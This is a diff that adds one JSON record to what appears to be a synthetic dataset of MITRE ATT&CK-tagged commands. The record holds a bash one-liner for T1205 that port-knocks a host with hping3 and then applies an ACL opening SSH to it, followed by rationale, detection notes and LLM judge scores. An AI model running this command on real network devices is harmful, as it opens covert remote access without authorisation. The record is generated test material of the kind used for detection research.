@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo bash -c 'for p in 2222 3333 4444; do hping3 -S -c 1 -p $p 10.0.0.2 >/dev/null; done; ciscoconf --apply \"ip access-list extended MGMT-REMOTE; permit tcp host 10.0.0.2 any eq 22\"'",
+  "explanation": "Sends a TCP SYN knock sequence to 10.0.0.2 (2222\u21923333\u21924444), then readies an ACL for that peer to access SSH. Requires sudo to craft packets with hping3.",
+  "rationale_steps": [
+    "Generate a multi-port knock sequence toward a peer to signal hidden service activation (T1205).",
+    "Adjust device ACL via ciscoconf to permit management from the peer.",
+    "No obfuscation; relies on specific port sequence signaling.",
+    "Detection: IDS/NetFlow alerts for odd SYNs to unusual ports and sudden ACL permitting 10.0.0.2."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-7a393370-ed1a10da",
+  "source_prompt_hash": "7a393370",
+  "timestamp_utc": "2025-09-30T06:01:37.763989Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command uses balanced quoting, valid hping3 flags, a well-formed for-loop, and proper command separators with no parsing issues.",
+        "semantic_score": 4,
+        "semantic_justification": "The hping3 loop correctly performs a SYN knock sequence consistent with T1205 and the configuration line prepares an ACL permitting SSH from 10.0.0.2, but practicality is reduced by assumptions about tool availability on network devices, sudo access, and the ACL not being attached to any interface/control-plane.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T16:16:31.584660Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct bash loop syntax, valid hping3 flags, proper command separators, and correctly nested quotes for the ciscoconf argument.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly demonstrates Traffic Signaling (T1205) by sending a TCP SYN port knock sequence as a signal, followed by an action (ACL modification via 'ciscoconf') which the explanation links as a consequence of that signaling to enable SSH access, aligning with 'coordinate actions' or 'trigger payloads'.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T16:17:06.741279Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
